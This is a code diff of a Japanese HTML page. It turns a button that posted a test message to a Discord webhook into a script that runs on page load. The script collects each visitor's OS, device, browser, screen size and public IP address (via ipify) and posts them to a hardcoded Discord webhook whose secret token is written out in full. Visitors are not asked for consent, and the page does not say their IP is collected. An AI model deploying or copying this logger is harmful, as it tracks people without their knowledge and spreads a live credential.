@@ -3,28 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook送信</title>
+    <title>デバイス情報送信</title>
 </head>
 <body>
-    <button id="sendMessage">メッセージを送信</button>
-    
+    <h2>デバイス情報送信中...</h2>
+    <!-- 画面に表示するための要素を追加 -->
+    <div id="browser-info"></div>
+    <div id="screen-info"></div>
+
     <script>
-        document.getElementById("sendMessage").addEventListener("click", function() {
+        // OS & デバイス判定
+        function detectDeviceAndOS() {
+            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            let os = "Unknown OS";
+            let device = "PC";
+
+            if (/windows/i.test(userAgent)) os = "Windows";
+            if (/macintosh|mac os x/i.test(userAgent)) os = "macOS";
+            if (/linux/i.test(userAgent)) os = "Linux";
+            if (/android/i.test(userAgent)) {
+                os = "Android";
+                device = "スマホ/タブレット";
+            }
+            if (/iphone|ipad|ipod/i.test(userAgent)) {
+                os = "iOS";
+                device = "スマホ/タブレット";
+            }
+
+            return { os, device };
+        }
+
+        // ブラウザ名の判定
+        function getBrowserName() {
+            let userAgent = navigator.userAgent;
+            let browserName = "不明";
+
+            if (/chrome|crios|crmo/i.test(userAgent)) browserName = "Google Chrome";
+            if (/firefox|fxios/i.test(userAgent)) browserName = "Mozilla Firefox";
+            if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent)) browserName = "Apple Safari";
+            if (/msie|trident/i.test(userAgent)) browserName = "Internet Explorer";
+            if (/edge/i.test(userAgent)) browserName = "Microsoft Edge";
+            if (/opera|opr/i.test(userAgent)) browserName = "Opera";
+            if (/android/i.test(userAgent)) browserName = "Android Browser";
+            if (/iphone|ipad|ipod/i.test(userAgent)) browserName = "iOS Safari";
+
+            return browserName;
+        }
+
+        // IPアドレス取得（外部API利用）
+        async function getIPAddress() {
+            try {
+                let response = await fetch("https://api64.ipify.org?format=json");
+                console.log("IPアドレス取得成功:", response);
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("IPアドレス取得失敗:", error);
+                return "取得失敗";
+            }
+        }
+
+        // 画面サイズの取得
+        function getScreenSize() {
+            return `${window.innerWidth} x ${window.innerHeight}`;
+        }
+
+        // 画面に表示
+        function displayDeviceInfo() {
+            let browser = getBrowserName();
+            let screenSize = getScreenSize();
+            
+            document.getElementById("browser-info").textContent = `ブラウザ: ${browser}`;
+            document.getElementById("screen-info").textContent = `画面サイズ: ${screenSize}`;
+        }
+
+        // Discord Webhookに送信
+        async function sendToDiscord() {
+            // デバイス情報を取得
+            const deviceInfo = detectDeviceAndOS();
+            const os = deviceInfo.os;
+            const device = deviceInfo.device;
+            const browser = getBrowserName();
+            const screenSize = getScreenSize();
+            const ipAddress = await getIPAddress();  // IPアドレスを取得
+
+            console.log("送信するデータ:", { os, device, browser, screenSize, ipAddress });
+
             const url = "https://discord.com/api/webhooks/1302564938740400140/lvukUZeArDJe8Xf7BcMovwU4ZnMbGhF8x5VTdv_NosxceUPIXUi8ncO9Bul2LtQE7ZW9";
             const data = {
-                content: "At.nemo. At.nemo. This is C.A.I. This signal is sent from HTML. over."
+                content: `This signal is sent from HTML. \nOS: ${os} \nDevice: ${device} \nBrowser: ${browser} \nScreen Size: ${screenSize} \nIP Address: ${ipAddress}`
             };
-            
-            fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => console.log("成功:", data))
-            .catch(error => console.error("エラー:", error));
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                console.log("ステータスコード:", response.status); // ステータスコードをログ出力
+                const responseText = await response.text(); // JSONとして解析する前にテキストとして取得
+                console.log("レスポンス内容:", responseText); // レスポンス内容をログ出力
+
+                if (response.status === 204) {
+                    console.log("送信成功: データは空のレスポンスで受信しました（正常）");
+                } else {
+                    const jsonResponse = JSON.parse(responseText); // 必要な場合にJSONとして解析
+                    console.log("成功:", jsonResponse);
+                }
+            } catch (error) {
+                console.error("Discord送信エラー:", error);
+            }
+        }
+
+        // ページがロードされた後に実行
+        document.addEventListener("DOMContentLoaded", function() {
+            displayDeviceInfo();  // 画面に表示
+            sendToDiscord();  // Discordに送信
         });
     </script>
 </body>
